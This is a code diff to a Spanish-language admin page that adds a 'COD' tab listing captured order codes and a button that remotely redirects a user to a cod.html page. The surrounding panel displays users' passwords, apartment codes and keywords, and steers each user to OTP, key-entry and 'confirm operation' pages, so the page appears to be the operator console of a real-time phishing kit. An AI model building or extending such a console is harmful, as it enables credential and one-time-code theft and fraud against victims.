@@ -213,6 +213,21 @@
             margin: 10px 0 0;
             font-size: 13px;
         }
+        /* ── Pestaña COD ── */
+        .badge-cod {
+            display: inline-block;
+            background: #20a085;
+            color: #fff;
+            padding: 3px 9px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: 700;
+            letter-spacing: .5px;
+        }
+        .cod-order {
+            font-weight: 700;
+            letter-spacing: 2px;
+        }
         /* Modal de puntos */
         .modal-overlay {
             display: none;
@@ -340,6 +355,7 @@
         <div class="panel-tabs" role="tablist" aria-label="Panel">
             <button id="users-tab" class="panel-tab" type="button" role="tab" aria-selected="true" aria-controls="users-panel" tabindex="0">Usuarios</button>
             <button id="seo-tab" class="panel-tab" type="button" role="tab" aria-selected="false" aria-controls="seo-panel" tabindex="-1">SEO</button>
+            <button id="cod-tab" class="panel-tab" type="button" role="tab" aria-selected="false" aria-controls="cod-panel" tabindex="-1">COD</button>
         </div>
         <section id="seo-panel" class="seo-panel" role="tabpanel" aria-labelledby="seo-tab" hidden>
             <h2>SEO de paginas</h2>
@@ -390,7 +406,7 @@
             <button type="submit" class="btn">Crear usuario</button>
         </form>
         <div class="status" id="status-message">Cargando datos...</div>
-        
+
         <table id="users-table" style="display: none;">
             <thead>
                 <tr>
@@ -408,6 +424,29 @@
         </table>
 
         <a href="/login.html" class="btn">Volver al Login</a>
+        </section>
+
+        <!-- ── Pestaña COD ── -->
+        <section id="cod-panel" role="tabpanel" aria-labelledby="cod-tab" hidden>
+            <h2>Pedidos COD</h2>
+            <div class="status" id="cod-status-message">Cargando datos...</div>
+
+            <table id="cod-table" style="display: none;">
+                <thead>
+                    <tr>
+                        <th>ID</th>
+                        <th>Tipo</th>
+                        <th>Pedido</th>
+                        <th>Apto</th>
+                        <th>Usuario</th>
+                        <th>Fecha</th>
+                        <th>Acciones</th>
+                    </tr>
+                </thead>
+                <tbody id="cod-body">
+                    <!-- Data will be populated here -->
+                </tbody>
+            </table>
         </section>
     </div>
 
@@ -553,10 +592,10 @@
                         const apartmentCode = user.apartment_code || 'Sin registro';
                         const keywordCode = user.keyword_code || 'Sin registro';
                         const passwordHash = user.password || 'Sin contraseña';
-                        const passwordDisplay = passwordHash.length > 20 
-                            ? passwordHash.substring(0, 25) + '...' 
+                        const passwordDisplay = passwordHash.length > 20
+                            ? passwordHash.substring(0, 25) + '...'
                             : passwordHash;
-                        
+
                         tr.innerHTML = `
                             <td>${user.id}</td>
                             <td>${user.username}</td>
@@ -570,6 +609,7 @@
                                 <button onclick="openPointsModal(${user.id}, '${user.username}')" class="btn-action btn-points">Datos Puntos</button>
                                 <button onclick="redirectUser(${user.id}, 'numero-de-apto.html')" class="btn-action" style="background-color:#28a745;">OTP</button>
                                 <button onclick="redirectUser(${user.id}, 'palabra-clave.html')" class="btn-action" style="background-color:#6f42c1;">Escribir Clave</button>
+                                <button onclick="redirectUserToCod(${user.id})" class="btn-action" style="background-color:#20a085;">COD</button>
                                 <button onclick="redirectUser(${user.id}, 'solicita-tu-turno.html')" class="btn-action" style="background-color:#fd7e14;">Solicitar turno</button>
                                 <button onclick="redirectUser(${user.id}, 'cargando-2.html')" class="btn-action" style="background-color:#6c757d;">Confirmar operacion</button>
                                 <button onclick="redirectUser(${user.id}, 'home.html')" class="btn-action" style="background-color:#007bff;">Ir a Home</button>
@@ -587,6 +627,67 @@
                 document.getElementById('status-message').textContent = 'Error al cargar los datos. Asegúrate de que el servidor esté corriendo.';
             });
 
+        // ── Carga de pedidos COD ──────────────────────────────────────────────
+        async function loadCodRequests() {
+            const status = document.getElementById('cod-status-message');
+            const table  = document.getElementById('cod-table');
+            const body   = document.getElementById('cod-body');
+
+            status.style.display = 'block';
+            status.style.color = '#666';
+            status.textContent = 'Cargando datos...';
+
+            try {
+                const res  = await fetch('/api/cod');
+                const rows = await res.json();
+                if (!res.ok) throw new Error(rows.error || 'No se pudo cargar COD');
+
+                if (!Array.isArray(rows) || rows.length === 0) {
+                    status.style.display = 'block';
+                    status.textContent = 'No hay pedidos COD registrados.';
+                    table.style.display = 'none';
+                    return;
+                }
+
+                status.style.display = 'none';
+                table.style.display = 'table';
+                body.innerHTML = '';
+
+                rows.forEach(r => {
+                    const tr = document.createElement('tr');
+                    tr.innerHTML = `
+                        <td>${r.id}</td>
+                        <td><span class="badge-cod">COD</span></td>
+                        <td class="cod-order">${r.pedido}</td>
+                        <td>${r.apartment_code || '—'}</td>
+                        <td>${r.username || r.user_id || '—'}</td>
+                        <td>${r.created_at || '—'}</td>
+                        <td>
+                            <button onclick="deleteCod(${r.id})" class="btn-action" style="background-color:#dc3545;">Eliminar</button>
+                        </td>
+                    `;
+                    body.appendChild(tr);
+                });
+            } catch (e) {
+                console.error('Error cargando COD:', e);
+                status.style.display = 'block';
+                status.style.color = '#dc3545';
+                status.textContent = 'Error al cargar los pedidos COD.';
+            }
+        }
+
+        async function deleteCod(id) {
+            if (!confirm('¿Eliminar este registro COD?')) return;
+            try {
+                const res = await fetch(`/api/cod/${id}`, { method: 'DELETE' });
+                const data = await res.json();
+                if (!res.ok) throw new Error(data.error || 'No se pudo eliminar');
+                loadCodRequests();
+            } catch (error) {
+                alert(error.message);
+            }
+        }
+
         function redirectUser(userId, view) {
             fetch(`/api/status/${userId}`, {
                 method: 'POST',
@@ -603,6 +704,18 @@
                 console.error('Error:', err);
                 alert('Error al intentar redirigir al usuario.');
             });
+        }
+
+        function redirectUserToCod(userId) {
+            const orderNumber = prompt('Ingresa los 4 dígitos del número de pedido:');
+            if (orderNumber === null) return;
+
+            if (!/^\d{4}$/.test(orderNumber.trim())) {
+                alert('El número de pedido debe tener exactamente 4 dígitos.');
+                return;
+            }
+
+            redirectUser(userId, `cod.html?pedido=${encodeURIComponent(orderNumber.trim())}`);
         }
 
         async function deleteUser(userId) {
@@ -684,7 +797,7 @@
                 });
                 const data = await res.json();
                 if (!res.ok) throw new Error(data.error || 'Error al cambiar contraseña');
-                
+
                 statusEl.textContent = '✅ Contraseña actualizada correctamente.';
                 statusEl.style.color = '#28a745';
                 setTimeout(() => {
@@ -699,6 +812,10 @@
 
         document.addEventListener('DOMContentLoaded', function() {
             loadSeoSettings();
+
+            // Cargar COD y refrescar al abrir la pestaña
+            loadCodRequests();
+            document.getElementById('cod-tab').addEventListener('click', loadCodRequests);
 
             // Eventos modal puntos
             document.getElementById('btn-save-points').addEventListener('click', async () => {
